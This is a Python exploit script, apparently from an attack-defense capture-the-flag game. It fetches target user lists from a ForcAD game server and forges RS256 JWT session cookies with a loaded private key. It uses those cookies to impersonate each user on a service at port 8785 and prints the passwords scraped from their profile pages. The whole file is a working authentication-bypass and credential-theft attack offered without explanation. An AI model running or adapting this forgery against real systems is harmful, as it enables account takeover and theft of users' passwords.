import requests
import checklib # pip install checklib!
import sys
import random
import json
import re
import time
import jwt # pip install pyjwt
from bs4 import BeautifulSoup


forcad_ip = '10.10.10.10'
def get_attack_data():
    return requests.get(f"http://{forcad_ip}/api/client/attack_data").json()['games'][ip]

def random_chars():    
    return checklib.rnd_string(10, ALPH)

private_key = open("keys/private.pem", "r").read()


def make_jwt(user_id, username):
    return jwt.encode({"user_id": user_id, "username": username}, private_key, algorithm="RS256")

regex = re.compile('[A-Z0-9]{31}=')
ALPH = [chr(i) for i in range(65, 65 + 26)] + [chr(i) for i in range(97, 97 + 26)]

session = requests.Session()

ip = sys.argv[1]

username = random_chars()
password = random_chars()
email = f"{random_chars()}@{random_chars()}.{random_chars()}"


# jwt_token = make_jwt()
if __name__ == "__main__":
    data = get_attack_data()
    for user in data:
        id, user = user.split(':')
        token = make_jwt(id, user)

        burp0_url = f"http://{ip}:8785/profile"
        burp0_cookies = {"session": token}
        burp0_headers = {"sec-ch-ua": "\"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"", "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": "\"macOS\"", "Accept-Language": "en-US,en;q=0.9", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "http://localhost:8785/choose_game", "Accept-Encoding": "gzip, deflate, br", "Connection": "keep-alive"}
        res = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
        soup = BeautifulSoup(res.text, 'html.parser')

        print(soup.find(id='password')['value'], flush=True)